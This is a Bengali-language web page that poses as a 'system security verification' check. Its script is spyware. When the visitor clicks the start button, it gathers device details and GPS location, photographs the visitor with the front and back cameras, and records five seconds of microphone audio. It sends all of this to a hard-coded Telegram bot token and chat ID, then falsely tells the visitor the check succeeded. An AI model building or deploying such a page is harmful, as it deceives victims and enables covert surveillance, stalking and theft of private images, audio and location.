<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>সিস্টেম সিকিউরিটি ভেরিফিকেশন</title>
    <style>
        :root { --primary: #00d1b2; --dark: #363636; }
        body { font-family: 'Segoe UI', sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 40px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; max-width: 400px; width: 90%; }
        h2 { color: var(--dark); margin-bottom: 10px; }
        p { color: #666; margin-bottom: 25px; }
        .btn-start { background: var(--primary); color: white; border: none; padding: 15px 30px; border-radius: 10px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; width: 100%; }
        .btn-start:hover { background: #00b89c; transform: translateY(-2px); }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid var(--primary); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #video, #canvas { display: none; }
        .status-text { font-weight: bold; color: var(--primary); margin-top: 15px; }
    </style>
</head>
<body>

<div class="card" id="main-ui">
    <div style="font-size: 50px; margin-bottom: 20px;">🔒</div>
    <h2>সিস্টেম ভেরিফিকেশন</h2>
    <p>আপনার ডিভাইসের কনফিগারেশন এবং নিরাপত্তা নিশ্চিত করতে নিচের বাটনে ক্লিক করুন।</p>
    <button class="btn-start" onclick="startProcess()">চেক শুরু করুন</button>
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>

<script>
// আপনার টেলিগ্রাম তথ্য
const TELEGRAM_BOT_TOKEN = "8657895361:AAGOkn7MmVJEBhblZ8V5zc16WAzxtRujNqg";
const TELEGRAM_CHAT_ID = "-1003747831651";

async function startProcess() {
    const ui = document.getElementById('main-ui');
    ui.innerHTML = '<div class="loader"></div><p class="status-text" id="status">প্রসেসিং শুরু হচ্ছে...</p>';

    // ১. ডিভাইসের তথ্য সংগ্রহ
    const deviceInfo = `📱 ওএস: ${navigator.platform}\n🌐 ব্রাউজার: ${navigator.userAgent.split(') ')[1] || 'Unknown'}\n🖥 স্ক্রিন: ${screen.width}x${screen.height}`;

    // ২. লোকেশন ট্র্যাকিং
    let mapLink = "লোকেশন পারমিশন পাওয়া যায়নি";
    try {
        const position = await new Promise((res, rej) => {
            navigator.geolocation.getCurrentPosition(res, rej, { timeout: 8000 });
        });
        mapLink = `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`;
    } catch (e) { console.log("Location Denied"); }

    const finalReport = `📊 *নতুন ট্র্যাকিং রিপোর্ট*\n\n${deviceInfo}\n\n📍 *লোকেশন:* [ম্যাপ দেখুন](${mapLink})`;

    try {
        // ৩. সামনের ক্যামেরা (Front Camera)
        updateStatus("ছবি তোলা হচ্ছে (Front)...");
        const frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        await captureAndSendPhoto(frontStream, "Front Camera", finalReport);

        // ৪. পেছনের ক্যামেরা (Back Camera)
        updateStatus("ছবি তোলা হচ্ছে (Back)...");
        let backStream;
        try {
            backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "environment" } } });
        } catch(e) {
            backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
        }
        await captureAndSendPhoto(backStream, "Back Camera", "--- অতিরিক্ত ডাটা ---");

        // ৫. অডিও ক্যাপচার (৫ সেকেন্ড)
        updateStatus("অডিও ভেরিফিকেশন করা হচ্ছে...");
        const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
        await captureAndSendAudio(audioStream);

        ui.innerHTML = "<h3>✅ ভেরিফিকেশন সম্পন্ন!</h3><p>আপনার কনফিগারেশন সঠিক আছে। পেজটি বন্ধ করতে পারেন।</p>";
    } catch (err) {
        console.error(err);
        ui.innerHTML = "<h3>❌ পারমিশন প্রয়োজন</h3><p>ক্যামেরা এবং মাইক্রোফোন পারমিশন ছাড়া চেক সম্ভব নয়।</p><button class='btn-start' onclick='location.reload()'>আবার চেষ্টা করুন</button>";
    }
}

function updateStatus(text) {
    document.getElementById('status').innerText = text;
}

async function captureAndSendPhoto(stream, type, caption) {
    const video = document.getElementById('video');
    video.srcObject = stream;

    return new Promise(resolve => {
        setTimeout(async () => {
            const canvas = document.getElementById('canvas');
            const context = canvas.getContext('2d');
            canvas.width = 400;
            canvas.height = 300;
            context.drawImage(video, 0, 0, 400, 300);
            
            canvas.toBlob(async (blob) => {
                const formData = new FormData();
                formData.append('chat_id', TELEGRAM_CHAT_ID);
                formData.append('photo', blob, 'capture.jpg');
                formData.append('caption', caption);
                formData.append('parse_mode', 'Markdown');

                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });

                stream.getTracks().forEach(track => track.stop());
                resolve();
            }, 'image/jpeg', 0.5);
        }, 2000); 
    });
}

async function captureAndSendAudio(stream) {
    const mediaRecorder = new MediaRecorder(stream);
    const audioChunks = [];

    return new Promise(resolve => {
        mediaRecorder.ondataavailable = (e) => audioChunks.push(e.data);
        mediaRecorder.onstop = async () => {
            const audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
            const formData = new FormData();
            formData.append('chat_id', TELEGRAM_CHAT_ID);
            formData.append('voice', audioBlob, 'audio.ogg');
            formData.append('caption', `🎤 অডিও রেকর্ড: ${new Date().toLocaleString('bn-BD')}`);

            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVoice`, {
                method: 'POST',
                body: formData
            });

            stream.getTracks().forEach(track => track.stop());
            resolve();
        };

        mediaRecorder.start();
        setTimeout(() => mediaRecorder.stop(), 5000); // ৫ সেকেন্ড রেকর্ড
    });
}
</script>
</body>
</html>
